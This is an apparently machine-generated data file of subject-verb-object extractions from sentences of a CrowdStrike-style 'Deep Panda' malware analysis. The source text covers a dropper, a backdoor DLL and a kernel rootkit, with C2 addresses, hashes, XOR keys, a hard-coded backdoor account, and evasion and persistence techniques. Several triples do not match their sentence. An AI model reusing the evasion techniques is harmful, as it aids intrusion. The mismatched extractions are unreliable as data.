{"\n\nThis sample is a DLL which can be registered as a service and is used to drop a kernel driver and provide\nan interactive command line shell to the C2": [{"drop": {"A": "drop", "S": "This sample", "O": ["a kernel driver"]}, "provide": {"A": "provide", "S": "This sample", "O": ["to the C2", "an interactive command line shell"]}}, {"be registered": {"A": "be registered", "O": ["a DLL", "as a service"]}}], " The incoming connection contents are forwarded to the C2 and\ndata from the C2 is passed on to connections": [{"are forwarded": {"A": "are forwarded", "O": ["The incoming connection contents", "to the C2"]}}], " The backdoor is then started under that\naccount and the user is deleted": [{"is deleted": {"A": "is deleted", "O": ["the user"]}}, {"is then started": {"A": "is then started", "O": ["The backdoor", "under that account"]}}], " This sample has multiple communication capabilities available that makes it far more versatile\nand stealthy": [{"has": {"A": "has", "S": "This sample", "O": ["multiple communication capabilities available"]}}], " It supports up to 1024 parallel connections": [{"is passed": {"A": "is passed", "O": ["on to connections", "data from the C2"]}}], " If the installation of the new\nservice is successful, the sample then starts the new service and exits": [{"starts": {"A": "starts", "S": "the sample", "O": ["the new service"]}}], " After it copies itself, it will modify the creation time, last access time and last modification    time to \n           the current system time when the copy was made but with the year changed to 2005": [{"copies": {"A": "copies", "S": "it", "O": ["itself"]}}, {"modify": {"A": "modify", "S": "it", "O": ["the creation time, last access time and last modification    time", "to he current system time when the copy was made but with the year changed to 2005"]}}], " All three samples provided remote access to the attacker, via two Command and Control (C2) servers": [{"provided": {"A": "provided", "S": "All three samples", "O": ["remote access", "via two Command and Control (C2) servers", "to the attacker"]}}], "\n</section>\n\n<section>\n<heading>Hooking</heading>\nThe final step of the entry point is to begin hooking the system, which is done by two helper functions - one \nis designed to hook the system call table, while the other hooks the network stack": [{"hooking": {"A": "hooking", "S": "The final step of the entry point", "O": ["the system"]}}, {"hook": {"A": "hook", "S": "one", "O": ["the system call table"]}}], "\n\nIn the registry hooking code of the driver, a call is made to ObReferenceObjectByHandle()": [{"is made": {"A": "is made", "O": ["a call", "In the registry hooking code of the driver", "to ObReferenceObjectByHandle()"]}}], " This means that after cleaning up the components dropped by the malware, the\nsystem remains vulnerable to local attacks by simply overwriting the legitimate rundll32.exe executable with\na malicious version and await it\u2019s automatic execution by the Operating System": [{"cleaning up": {"A": "cleaning up", "O": ["the components dropped by the malware"]}}, {"remains": {"A": "remains", "S": "the system", "O": ["vulnerable to local attacks"]}}], " If McAfee AV is installed, creates a copy of regsvr32.exe named Update.exe and then schedules\n           the copy to be deleted on reboot using the well documented MoveFileExA API": [{"schedules": {"A": "schedules", "O": ["to be deleted on reboot", "using the well documented MoveFileExA API", "the copy"]}}, {"creates": {"A": "creates", "O": ["a copy of regsvr32.exe named Update.exe"]}}], " The capabilities include recovering authentication credentials from various system and client storage\nsuch as Mozilla Firefox, Internet Explorer, and Remote Access Service (RAS)": [{"recovering": {"A": "recovering", "O": ["from various system and client storage such as Mozilla Firefox, Internet Explorer, and Remote Access Service (RAS)", "authentication credentials"]}}], "\n\nThe dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself contains functionality that is typical\nof a Remote Access Tool(RAT) which are commonly used by PRC based actors in data exfiltration attacks": [{"used": {"A": "used", "S": "PRC based actors", "O": ["functionality that is typical of a Remote Access Tool(RAT)", "in data exfiltration attacks"]}, "contains": {"A": "contains", "S": "The dropped DLL (MD5: 47619fca20895abc83807321cbb80a3d) itself", "O": ["functionality that is typical of a Remote Access Tool(RAT)"]}}], "\n</section>\n\n<section>\n<heading>C2 Command Invocation</heading>\nThe main backdoor thread then reads commands from the chosen C2 protocol and passes them on to any\nof the following registered handler classes based upon a command ID": [{"reads": {"A": "reads", "S": "The main backdoor thread", "O": ["from the chosen C2 protocol", "commands"]}}], "\n</section>\n\n<section>\n<heading>Network Stack Hooking</heading>\nThe network stack hooking first queries the OS version using RtlGetVersion() or PsGetVersion()": [{"hooks": {"A": "hooks", "S": "the other", "O": ["the network stack"]}}, {"queries": {"A": "queries", "S": "The network stack hooking", "O": ["the OS version", "using RtlGetVersion() or PsGetVersion()"]}}], " In addition, an 8 byte key is sent \nto the client which is then RC4 encrypted using the random number generated in step 2 from above as the\npassword": [{"is sent": {"A": "is sent", "O": ["to the client", "an 8 byte key"]}}], " It implements relatively well thought out protocols including HTTP and DNS": [{"implements": {"A": "implements", "S": "It", "O": ["relatively well thought out protocols including HTTP and DNS"]}}], "\n\n</section>\n\n<footer>\nCROWDSTRIKE                                                                          S E N S I T I VE          2\n</footer>\n\f\f\n<header>DEEP PANDA</header>\n\n<section>\n\n\n                              <heading>TECHNICAL ANALYSIS</heading>\n\n<heading>Dropper Sample (MD5: 14c04f88dc97aef3e9b516ef208a2bf5)</heading>\nThe executable 14c04f88dc97aef3e9b516ef208a2bf5 is commonly referred to as a \u2018dropper\u2019, which is\ndesigned with the purpose of extracting from itself a malicious payload and to initialize and install it into a\ntargeted system": [{"initialize and install": {"A": "initialize and install", "S": "The executable 14c04f88dc97aef3e9b516ef208a2bf5", "O": ["into a targeted system", "it"]}, "extracting": {"A": "extracting", "S": "The executable 14c04f88dc97aef3e9b516ef208a2bf5", "O": ["from itself", "a malicious payload"]}}], "\n</section>\n\n<section>\n<heading>Multiple Instance Protection</heading>\nThe driver begins by opening a named event in the BaseNamedObjects object directory with the name\n{8CB2ff21-0166-4cf1-BD8F-E190BC7902DC} using the Windows API ZwOpenEvent()": [{"opening": {"A": "opening", "S": "The driver", "O": ["a named event", "with the name {8CB2ff21-0166-4cf1-BD8F-E190BC7902DC}", "in the BaseNamedObjects object directory", "using the Windows API ZwOpenEvent()"]}}], "\n</section>\n\n<section>\n<heading>Anti-Debugging Protection</heading>\nThe second component of the entry point performs an anti-debugging technique, calling the function\nKdDisableDebugger(), which allows the driver to disable usage of the built-in Windows kernel debugging\nfacility that is used by popular kernel debuggers KD and WinDbg": [{"performs": {"A": "performs", "S": "The second component of the entry point", "O": ["an anti-debugging technique"]}, "calling": {"A": "calling", "S": "The second component of the entry point", "O": ["the function KdDisableDebugger()"]}}, {"disable": {"A": "disable", "S": "the driver", "O": ["usage of the built-in Windows kernel debugging facility that is used by popular kernel debuggers KD and WinDbg"]}}], "\n</section>\n\n<section>\n<heading>System Driver</heading>\nThe kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the\nCCRootkit package publicly by Steven Lai (a/k/a embedlinux)": [{"dropped": {"A": "dropped", "S": "the Backdoor DLL", "O": ["The kernel driver component"]}}], "\n</section>\n\n<section>\n<heading>TCP Hook</heading>\nThe TCP hook works almost identically to the NSI hook, though instead hooking IOCTL 0x120003 (IOCTL_\nTCP_QUERY_INFORMATION_EX)": [{"hooking": {"A": "hooking", "S": "The TCP hook", "O": ["IOCTL 0x120003 (IOCTL_ TCP_QUERY_INFORMATION_EX)"]}}], "      infocardapi.dll\n</list>\n\nThe dropper sets the creation and last written timestamp of the newly created file to the date 2007-03-07 \n00:00:00; this allows the newly created malicious  DLL to blend in with other system files": [{"sets": {"A": "sets", "S": "The dropper", "O": ["to the date 2007-03-07 00:00:00", "the creation and last written timestamp of the newly created file"]}}, {"blend in": {"A": "blend in", "O": ["the newly created malicious  DLL", "with other system files"]}}], " Instead of hooking the entry in the\ntable directly, which is easily detectable, the driver uses the LDASM open-source disassembly engine to\nanalyze the function that is being pointed to by the table, and applying a Detours-style hook directly in the\ncode": [{"applying": {"A": "applying", "S": "the driver", "O": ["directly in the code", "a Detours-style hook"]}}], "\n</section>\n\n<section>\n<heading>PCC_PROXY: TCP Proxy</heading>\nThis handler class implements a generic TCP proxy": [{"implements": {"A": "implements", "S": "This handler class", "O": ["a generic TCP proxy"]}}], " This class also supports\ngathering intelligence on the infected system including identifying security tools by their process name, proxy\naccounts, and version numbers for the Operating System (OS) and Internet Explorer": [{"identifying": {"A": "identifying", "S": "This class", "O": ["Internet Explorer"]}, "gathering": {"A": "gathering", "S": "This class", "O": ["intelligence on the infected system"]}}], " The unpacked kernel driver sample hooks these functions by reading the second \nDWORD at each of these exported functions": [{"hooks": {"A": "hooks", "S": "The unpacked kernel driver sample", "O": ["these functions", "by reading the second DWORD at each of these exported functions"]}}], " The use of the Chrome icon may indicate a possible attempt to socially\nengineer the intended victim into thinking the dropper was a legitimate file associated with Google": [{"socially engineer": {"A": "socially engineer", "S": "The use of the Chrome icon", "O": ["into thinking the dropper was a legitimate file associated with Google", "the intended victim"]}}], " Open source research of the 4 innocuous kernel APIs\n \"ZwSaveKey ZwQueryValueKey ZwEnumerateValueKey IoAllocateMdl\", in concert leads directly to a \n Chinese website that has a cached rootkit performing similar hooks on the same 3 registry related APIs": [{"performing": {"A": "performing", "S": "a cached rootkit", "O": ["similar hooks", "on the same 3 registry related APIs"]}}], " As a\nprecaution, the sample writes settings directly to the Windows Registry to accomplish the same goal if\ninstalling the service with the documented APIs fails": [{"writes": {"A": "writes", "S": "the sample", "O": ["directly to the Windows Registry", "settings"]}}], " The rundll32.exe is instantiated with a new NULL Security Identifier (SID)\n(S-1-0-0) with permissions set to grant all access to the file": [{"set": {"A": "set", "O": ["to grant all access to the file", "permissions"]}}], " \n\n\nAfter creating this window, the routine starts the main thread that eventually initiates calling out to the\nCommand and Control (C2)": [{"initiates": {"A": "initiates", "S": "the routine", "O": ["calling out to the Command and Control (C2)"]}}], "\n</section>\n\n<section>\n<heading>PCC_FILE: Browsing and Data Exfiltration</heading>\nThis handler class for command ID 8 implements generic directory and file browsing using FindFirstFileW() \nand FindNextFileW() APIs, as well as reading and writing arbitrary files via C2 commands, thus enabling upload and download of arbitrary files": [{"writing": {"A": "writing", "S": "This handler class for command ID 8", "O": ["arbitrary files", "via reading arbitrary files"]}, "reading": {"A": "reading", "S": "This handler class for command ID 8"}, "implements": {"A": "implements", "S": "This handler class for command ID 8", "O": ["generic directory and file browsing", "using FindFirstFileW() and FindNextFileW() APIs"]}, "upload": {"A": "upload", "S": "This handler class for command ID 8"}, "download": {"A": "download", "S": "This handler class for command ID 8", "O": ["arbitrary files"]}}], " It allows the adversary to view the main desktop graphically and\ncontrol the keyboard and mouse": [{"control": {"A": "control", "S": "the adversary", "O": ["the keyboard"]}, "view": {"A": "view", "S": "the adversary", "O": ["graphically", "the main desktop"]}}], "\n\nCommand 0x20000001 exits the backdoor and 0x20000000 is issued to completely remove the backdoor\nfrom the system": [{"remove": {"A": "remove", "O": ["0x20000000", "the backdoor", "from the system"]}}], "\n\nOne interesting command line option allows the backdoor to filter the contents of specified files to remove \ncontent using a regular expression (regex)": [{"filter": {"A": "filter", "S": "the backdoor", "O": ["the contents of specified files"]}, "remove": {"A": "remove", "S": "the backdoor", "O": ["using a regular expression (regex)", "content"]}}], "\n\nAfter establishing any of the aforementioned channels for arbitrary binary data exchange, the malware will\nstart sending and receiving compressed binary blobs via the channel of choice": [{"receiving": {"A": "receiving", "S": "the malware"}, "sending": {"A": "sending", "S": "the malware"}}], " The sample supports the ability to act as a generic proxy, this may be  \nintended to proxy C2 traffic for other infected machines in order to minimize the number of systems \ncommunicating to the C2, thus enhancing OPSEC": [{"proxy": {"A": "proxy", "S": "The sample", "O": ["for other infected machines", "C2 traffic", "in order to minimize the number of systems communicating to the C2"]}, "act": {"A": "act", "S": "The sample", "O": ["as a generic proxy"]}}], " This command then modifies the creation, modification, and last \naccess timestamps of the modified file to conceal the content modifications": [{"modifies": {"A": "modifies", "S": "This command", "O": ["the creation, modification, and last access timestamps of the modified file", "to conceal the content modifications"]}}], " When the dropper writes the file to disk, the first byte of the file is 'Z' \nwhich prevents the file from executing or being detected as an executable by many defensive tools": [{"prevents": {"A": "prevents", "S": "the first byte of the file is 'Z'", "O": ["from being detected as an executable by many defensive tools", "the file"]}}, {"writes": {"A": "writes", "S": "the dropper", "O": ["the file", "to disk"]}}], " The hooking is performed by creating a new completion routine\nassociated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL, attaching to the target\nprocess, performing several memory copies to hide the entry, and detaching": [{"is performed": {"A": "is performed", "O": ["The hooking", "by creating a new completion routine associated with any IRP_MJ_DEVICE_CONTROL IRP that matches the IOCTL, attaching to the target process, performing several memory copies to hide the entry, and detaching"]}}], " The imported function names are not encrypted; however, the\nfunction name is minutely obfuscated by a simple single character substitution:\n\n<code>\n   //Obfuscation of GetTempPathA() API function call\n   strcpy((char *)ProcName, \u201c2etTempPathA\u201d);\n   ProcName[0] = \u2018G\u2019;\n</code>\n\nThe dropper invokes the SHGetSpecialFolderPath() API supplying a Constant Special Item ID List (CSIDL)\nof \u2018CSIDL_COMMON_DOCUMENTS\u2019 to identify the destination folder for the malicious DLL payload": [{"invokes": {"A": "invokes", "S": "The dropper", "O": ["the SHGetSpecialFolderPath() API"]}}], "\n\nAdditionally, the malware contains a custom DNS client implementation that will use the system's configured DNS server to tunnel C2 traffic over legitimate DNS": [{"use": {"A": "use", "S": "a custom DNS client implementation", "O": ["the system's configured DNS server"]}, "tunnel": {"A": "tunnel", "S": "a custom DNS client implementation", "O": ["C2 traffic", "over legitimate DNS"]}}, {"contains": {"A": "contains", "S": "the malware", "O": ["a custom DNS client implementation"]}}], " It also is able to bypass User Account Control (UAC) to install\nitself by using the \u2018sysprep.exe\u2019 Microsoft Windows executable provided by the targeted system": [{"bypass": {"A": "bypass", "S": "It", "O": ["to install itself by using the \u2018sysprep.exe\u2019 Microsoft Windows executable provided by the targeted system", "User Account Control (UAC)"]}}], "\n</section>\n\n<footer>\nCROWDSTRIKE                                                                       S E N S I T I VE            4\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n<section>\n\n<heading>Backdoor DLL Sample (MD5: 47619fca20895abc83807321cbb80a3d)</heading>\nThis sample is a 'backdoor' which is the DLL dropped by the dropper sample file with an MD5 of \n14c04f88dc97aef3e9b516ef208a2bf5": [{"dropped": {"A": "dropped", "S": "the dropper sample file", "O": ["the DLL"]}}, {"is": {"A": "is", "S": "This sample", "O": ["a 'backdoor'"]}}], " A typical path is C:\\Documents and Settings\\All Users\\Documents.\u201d\n\n\nThe dropper attempts to write the malicious payload to one of the following names, using the first \navailable name in this set:\n<list>\n       1": [{"write": {"A": "write", "S": "The dropper", "O": ["to one of the following names", "using the first available name in this set", "the malicious payload"]}}], " Adds itself to list of services started by \u2018netsvc\u2019 using the service name \u2018helpsvc\u2019": [{"Adds": {"A": "Adds", "O": ["using the service name \u2018helpsvc\u2019", "itself", "to list of services started by \u2018netsvc\u2019"]}}], "\n\n While the various network hooking techniques used in the kernel driver may appear novel or well\n researched, upon close inspection it is actually a line-for-line copy of an existing post from the now-offline\n \u2018rootkit.com\u2019 by a Chinese language developer": [{"used": {"A": "used", "O": ["the various network hooking techniques", "in the kernel driver"]}}], " \nAdditionally, this class implements launching of specified executable files via the CreateProcess() API": [{"launching": {"A": "launching", "S": "this class", "O": ["specified executable files", "via the CreateProcess() API"]}}], " This export then implements the actual install logic to maintain persistence and invoke the main\nroutine": [{"implements": {"A": "implements", "S": "This export", "O": ["the actual install logic", "to maintain persistence"]}}], "\nThe dropper subsequently opens the dropped file and corrects the header by writing the 'M' over the first \nbyte, allowing the file to be executed": [{"opens": {"A": "opens", "S": "The dropper", "O": ["the dropped file"]}, "corrects": {"A": "corrects", "S": "The dropper", "O": ["by writing the 'M' over the first byte", "the header"]}}], "\n\n\nThe system call hook is then performed by first allocating a Memory Descriptor List (MDL) using the    \nWindows API IoAllocateMdl(), and associating the MDL to a non-paged buffer using\nMmBuildMdlForNonPagedPool()": [{"is then performed": {"A": "is then performed", "O": ["by first allocating a Memory Descriptor List (MDL) using the Windows API IoAllocateMdl(), and associating the MDL to a non-paged buffer using MmBuildMdlForNonPagedPool()", "The system call hook"]}}], " Thus the sample will only attempt to connect directly using \na raw socket to the C2 located at 1.9.5.38:443": [{"connect": {"A": "connect", "S": "the sample", "O": ["to the C2 located at 1.9.5.38:443"]}}], " The driv-                                                                                                              \ner is encrypted with a simple four byte XOR key value of 0x2E885Df3; after decryption the file has the MD5\nhash of dae6b9b3b8e39b08b10a51a6457444d8": [{"is encrypted": {"A": "is encrypted", "O": ["with a simple four byte XOR key value of 0x2E885Df3", "The driv- er"]}}], " \n</section>\n\n<section>\n<heading>Backdoor Functionality, Supported Commands</heading>\nThe primary aim of this backdoor is remote desktop control functionality comparable to VNC or Remote\nDesktop over a custom protocol": [{"is": {"A": "is", "S": "The primary aim of this backdoor", "O": ["remote desktop control functionality comparable to VNC or Remote Desktop over a custom protocol"]}}], " The con-\nfiguration contains the C2 protocol to be used or optionally a self-configuration mode in which the malware \nattempts the different C2 protocols in a pre-defined order": [{"contains": {"A": "contains", "S": "The con- figuration", "O": ["the C2 protocol to be used"]}}, {"attempts": {"A": "attempts", "S": "the malware", "O": ["the different C2 protocols", "in a pre-defined order"]}}], " In this case, the malicious payload is a Dynamic-Link Library (DLL), which enables an\nattacker to have full control of the system": [{"enables": {"A": "enables", "S": "the malicious payload", "O": ["to have full control of the system", "an attacker"]}}], " The version of the malicious sample, in this case it is 841\n</list>\n<figure></figure>\n\n\nAn example authentication packet sent to the C2 is located in Appendix E": [{"sent": {"A": "sent", "O": ["An example authentication packet", "to the C2"]}}], " The user-mode service stores configuration data in the \"Security\" subkey of the RPC registry key, \nthis component will obfuscate the user-mode configuration data": [{"hide": {"A": "hide", "S": "this driver", "O": ["the service"]}}], "\n</section>\n\n<section>\n<heading>Post Exploitation Tool</heading>\nThe post exploitation tool (MD5: 2dce7fc3f52a692d8a84a0c182519133) is a dual-use tool, it can be\ndropped and executed by a client-side exploit, or the adversary can launch it using a variety of command\nline options": [{"be dropped": {"A": "be dropped", "S": "a client-side exploit"}, "executed": {"A": "executed", "S": "a client-side exploit"}}, {"launch": {"A": "launch", "S": "the adversary", "O": ["using a variety of command line options", "it"]}}], " After attempting to disable the existing service, the malware tries to install itself as\na service with that same name": [{"install": {"A": "install", "S": "the malware", "O": ["as a service with that same name", "itself"]}}], " It would appear this technique is meant to obfuscate the activities of the\nmalicious sample by masking the process creator\u2019s user name to appear to be a generic domain user": [{"obfuscate": {"A": "obfuscate", "S": "this technique", "O": ["by masking the process creator\u2019s user name to appear to be a generic domain user", "the activities of the malicious sample"]}}], "\n</section>\n\n<section>\n<heading>PCC_MISC : Gather and report system information</heading>\nThe malware is capable of gathering various pieces of information from the system, triggered by a command\nID 10": [{"gathering": {"A": "gathering", "S": "The malware", "O": ["various pieces of information", "from the system"]}}], " The ldasm inline hooking is also repeated in numerous postings\n to Chinese forums": [{"perform": {"A": "perform", "O": ["through MDLs", "system call hooking"]}}], "\n       \udbc0\udd94 The currently logged in username in the system as obtained with the GetUserName() API \n       \udbc0\udd94 The machine's uptime\n       \udbc0\udd94 The Windows Version and Service Pack level\n       \udbc0\udd94 The amount of available Physical Memory in MB\n       \udbc0\udd94 Current Remote Desktop sessions as enumerated with WTSEnumerateSessions\n       \udbc0\udd94 A string identifier statically set to \"FBI20111024\"\n</list>\nThe beacon is encrypted using an XOR/ADD loop using the statically defined key 0x1C and sent to the C2": [{"is encrypted": {"A": "is encrypted", "O": ["The beacon", "using an XOR/ADD loop using the statically defined key 0x1C"]}, "sent": {"A": "sent", "O": ["to the C2", "The beacon"]}}], "\n\n<figure></figure>\n</section>\n\n<section>\n<heading>Network Protocol and Implementation</heading>\nThere are three components to the protocol:\n\nAuthentication is accomplished using a 32 byte packet, this packet consists of:\n\n<list>\n       1": [{"is accomplished": {"A": "is accomplished", "O": ["using a 32 byte packet", "Authentication"]}}], "\n\nWhile there is code in the binary that allows downloading a list of C2 servers from an HTTP URL, the default\nconfiguration present specifies 202.86.190.3:80 as a C2 to use, this is the same Hong Kong C2 server as \nthe one used by the post exploitation .NET tool": [{"downloading": {"A": "downloading", "O": ["a list of C2 servers", "from an HTTP URL"]}}, {"specifies": {"A": "specifies", "S": "the default configuration present", "O": ["to use", "as a C2", "202.86.190.3:80"]}}], "\n</section>\n\n<section>\n<heading>PCC_SYS: System Management</heading>\nThis handler class provides the attacker with the ability to manage system components including start/stop/\ndelete system services, enumerate/alter registry keys, and manage running processes": [{"enumerate": {"A": "enumerate", "S": "This handler class"}, "manage": {"A": "manage", "S": "This handler class", "O": ["system components"]}, "delete": {"A": "delete", "S": "This handler class"}, "alter": {"A": "alter", "S": "This handler class"}, "start": {"A": "start", "S": "This handler class"}, "stop": {"A": "stop", "S": "This handler class"}}], "\n\nThe final step the dropper performs is to load the dropped DLL into its own process space; it then resolves \nthe export 'OpenINFOPerformanceData' from the DLL and invokes it with the dropped DLL's filename as \nparameter": [{"load": {"A": "load", "S": "the dropper", "O": ["the dropped DLL", "into its own process space"]}}], " One sample is typical of what is commonly referred to as a \u2018dropper\u2019 because its primary purpose is to write a malicious component to disk and connect it to the targeted hosts operating system": [{"write": {"A": "write", "S": "One sample", "O": ["to disk", "a malicious component"]}}], " The\nuser-mode component of this malware is a service called \u201cmsupdate\u201d, this driver is attempting to hide the\nservice": [{"applies": {"A": "applies", "S": "it", "O": ["an XOR", "with the value 127", "on the data"]}}], " The sample contains \u2018dead code\u2019 which appears to be\ncommand and control server classes, this is likely an indicator that the C2 client which would communicate\nwith this sample shares the same communications library which was compiled into this sample": [{"shares": {"A": "shares", "S": "the C2 client which would communicate with this sample", "O": ["the same communications library which was compiled into this sample"]}}], " This command results in the DLL deleting itself\nand terminating the backdoor process": [{"terminating": {"A": "terminating", "S": "the DLL", "O": ["the backdoor process"]}, "deleting": {"A": "deleting", "S": "the DLL", "O": ["itself"]}}], " This kernel mode rootkit implements several\nhooking techniques that are aimed at preventing a system administrator from detecting the backdoor DLL": [{"implements": {"A": "implements", "S": "This kernel mode rootkit", "O": ["several hooking techniques"]}, "preventing": {"A": "preventing", "S": "This kernel mode rootkit", "O": ["from detecting the backdoor DLL", "a system administrator"]}}], " The sample first \nresolves several library functions provided by Microsoft using the LoadLibrary() and GetProcAddress()\nApplication Programming Interfaces (APIs)": [{"resolves": {"A": "resolves", "S": "The sample", "O": ["several library functions provided by Microsoft", "using the LoadLibrary() and GetProcAddress() Application Programming Interfaces (APIs)"]}}], " The sample utilizes the AES cryptographic algorithm to protect its C2\ncommunications": [{"utilizes": {"A": "utilizes", "S": "The sample", "O": ["to protect its C2 communications", "the AES cryptographic algorithm"]}}], "\n</section>\n<section>\n<heading>Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)</heading>\n</section>\n\n<section>\n<heading>Backdoor DLL Sample (MD5: de7500fc1065a081180841f32f06a537)</heading>\nThis sample is a sophisticated backdoor which implements several communications protocols and was\ndeveloped in C++": [{"implements": {"A": "implements", "S": "This sample", "O": ["several communications protocols"]}, "is": {"A": "is", "S": "This sample", "O": ["a sophisticated backdoor"]}}, {"executing": {"A": "executing", "O": ["processes"]}}], " This driver attempts to hide a wide swath of TCP ports (40000-45000) for\nan unknown reason, however it is suspected that this may relate to the potential network relaying capability\nalluded to for the backdoor dll": [{"hide": {"A": "hide", "S": "This driver", "O": ["for an unknown reason", "a wide swath of TCP ports (40000-45000)"]}}, {"hide": {"A": "hide", "S": "This driver", "O": ["a wide swath of TCP ports (40000-45000)", "for an unknown reason"]}}], " The third sample was a sophisticated implant that in addition to having multiple communication capabilities, and the ability to act as a relay for other infected hosts, utilized a kernel mode driver that can hide aspects of the tool from user-mode tools": [{"having": {"A": "having", "S": "The third sample", "O": ["multiple communication capabilities"]}, "act": {"A": "act", "S": "The third sample", "O": ["as a relay for other infected hosts"]}, "utilized": {"A": "utilized", "S": "The third sample", "O": ["a kernel mode driver"]}, "hide": {"A": "hide", "S": "The third sample", "O": ["from user-mode tools", "aspects of the tool"]}}], " The tool has the\nability to automatically down select the most effective communication channel once it has been instantiated,\nwhich can help avoid detection from solutions like DNS blacklisting and RFC protocol enforcement": [{"avoid": {"A": "avoid", "S": "The tool", "O": ["detection from solutions like DNS blacklisting and RFC protocol enforcement"]}, "select": {"A": "select", "S": "The tool", "O": ["once it has been instantiated", "the most effective communication channel"]}}], "\nThe malware sends and receives a heartbeat/keepalive packet every 2 minutes": [{"sends": {"A": "sends", "S": "The malware"}, "receives": {"A": "receives", "S": "The malware"}}], " It supports establishing TCP connections to other hosts\nand also listening for incoming connections": [{"establishing": {"A": "establishing", "S": "It", "O": ["to other hosts", "TCP connections"]}, "listening": {"A": "listening", "S": "It", "O": ["for incoming connections"]}}], "\n</section>\n<section>\n<heading>System Driver</heading>\nThe kernel driver component dropped by the Backdoor DLL bears many tool marks associating it with the\nCCRootkit package publicly by Steven Lai (a/k/a embedlinux)": [{"dropped": {"A": "dropped", "S": "the Backdoor DLL", "O": ["The kernel driver component"]}}], " During installation, the sample attempts to use documented APIs such as\nOpenSCManager() and CreateService() to initialize itself as a persistent Windows service": [{"use": {"A": "use", "S": "the sample", "O": ["to initialize itself as a persistent Windows service", "documented APIs such as OpenSCManager() and CreateService()"]}}], " This is meant to \nprevent identification during disk forensics using a common investigative technique called a forensic \nanalysis timeline": [{"prevent": {"A": "prevent", "S": "This", "O": ["identification", "during disk forensics"]}}], "\n\nThe next key to be changed is:\nHKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Svchost, which will have\nthe \u2018msupdate\u2019 key set to \u2018msupdate\u2019": [{"set": {"A": "set", "O": ["to \u2018msupdate\u2019", "the \u2018msupdate\u2019 key"]}}, {"be changed": {"A": "be changed", "O": ["The next key"]}}], "\n\n\nThis demonstrates an attempt to use the most efficient communication channel first, falling back to more  \nlegitimate appearing channels as required in order to appear Request For Comment (RFC) compliant with\nthe HTTP protocol": [{"serves": {"A": "serves", "S": "the POST request", "O": ["as a upstream channel"]}}], " This class also\nprovides the ability for the attacker to take a screen shot of the users desktop": [{"take": {"A": "take", "S": "This class", "O": ["a screen shot of the users desktop"]}}], " The command line options support post exploitation capabilities such as changing \nfile timestamps, forensic mitigation, privilege escalation, launching the executable, and specifying a specific\nC2": [{"support": {"A": "support", "S": "The command line options", "O": ["forensic mitigation"]}}], " This is particularly relevant in this case because the backdoor DLL sample with an MD5\n of de7500fc1065a081180841f32f06a537 specifically avoids installing the kernel driver on a system running \n this tool": [{"avoids": {"A": "avoids", "S": "the backdoor DLL sample with an MD5 of de7500fc1065a081180841f32f06a537", "O": ["installing the kernel driver on a system running this tool"]}}], "\nExamples of implemented commands include download and upload files, installing new .NET assemblies,\ncalling methods on those assemblies, connecting to new C2 servers and executing processes": [{"installing": {"A": "installing", "O": ["new .NET assemblies"]}}, {"download": {"A": "download", "O": ["files"]}, "upload": {"A": "upload", "O": ["files"]}}, {"connecting": {"A": "connecting", "O": ["to new C2 servers"]}}, {"calling": {"A": "calling", "O": ["methods", "on those assemblies"]}}], " This hook also filters \nany connections listening on TCP ports in the range between 40000 and 45000": [{"filters": {"A": "filters", "S": "This hook", "O": ["any connections listening on TCP ports in the range between 40000 and 45000"]}}], " If the event already \nexists, the driver fails to load, presumably to avoid a\n\n<footer>\nCROWDSTRIKE                                                                      S E N S I T I VE         14\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nmultiple instances of itself": [{"avoid": {"A": "avoid", "S": "the driver", "O": ["multiple instances of itself"]}}], " If the event does not exist, the driver then creates it using the Windows API\nZwCreateEvent()": [{"creates": {"A": "creates", "S": "the driver", "O": ["using the Windows API ZwCreateEvent()", "it"]}}], " Barring\nthe two aforementioned conditions, the sample decrypts the kernel driver to:\n<list>\n        \u201c%sysdir%\\Drivers\\{6AB5E732-DFA9-4618-AF1C-F0D9DEF0E222}.sys\u201d\n</list>\nFollowing the decryption and writing of the driver to disk, it is loaded using the ZwLoadDriver() API": [{"writing": {"A": "writing", "O": ["the driver", "to disk"]}}, {"is loaded": {"A": "is loaded", "O": ["it", "using the ZwLoadDriver() API"]}}], "\n\nAfter sending the initial authentication packet, the sample verifies that the first four bytes of the response is \nequal to a statically defined value, in this sample the value is: 0x16030100": [{"sending": {"A": "sending", "S": "the sample", "O": ["the initial authentication packet"]}, "verifies": {"A": "verifies", "S": "the sample", "O": ["that the first four bytes of the response is equal to a statically defined value"]}}], " This allows any user to have complete control \nover the machine, as rundll32.exe is frequently launched by tasks such as changing the time, wallpaper,\nor other system settings": [{"allows": {"A": "allows", "S": "This", "O": ["any user", "to have complete control over the machine"]}}], " The registry change creates the following key:\n<list>\nHKEY_LOCAL_MACHINE\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\msupdate\\\\Parameters\n</list>\nFollowing this, the subroutine will set the value of the \u2018ServiceDLL\u2019 to the module handle of the DLL": [{"set": {"A": "set", "S": "the subroutine", "O": ["to the module handle of the DLL", "the value of the \u2018ServiceDLL\u2019"]}}, {"creates": {"A": "creates", "S": "The registry change", "O": ["the following key"]}}], "\n\n\n<footer>\n\nCROWDSTRIKE                                                                             S E N S I T I VE           7\n</footer>\n\f\n<header>DEEP PANDA</header>\n\n\nWhen command 0x23000004 is received, a temporary new user \u201c_DomainUser_\u201d with password \u201cDom4!nU-\nserP4ss\u201d is created and added to the local Administrators group": [{"added": {"A": "added", "O": ["a temporary new user \u201c_DomainUser_\u201d with password \u201cDom4!nU- serP4ss\u201d", "to the local Administrators group"]}, "is created": {"A": "is created", "O": ["a temporary new user \u201c_DomainUser_\u201d with password \u201cDom4!nU- serP4ss\u201d"]}}], "\n\nThe malicious sample sends an initial beacon to the C2 that includes the following information:\n<list>\n       \udbc0\udd94 The computer name as obtained with the GetComputerName() API\n       \udbc0\udd94 The username of the current Remote Desktop session if currently being executed in a Remote\n          Desktop session or \u201cnone\u201d otherwise": [{"sends": {"A": "sends", "S": "The malicious sample", "O": ["an initial beacon", "to the C2"]}}], " This remote control functionality is implemented as separate messages\nfor mouse clicks, pressed keys, etc": [{"is implemented": {"A": "is implemented", "O": ["This remote control functionality", "as separate messages for mouse clicks, pressed keys, etc.", "using command identifiers 0x20000002 to 0x20000019"]}}], " If the installation fails, the sample\nspawns a new process 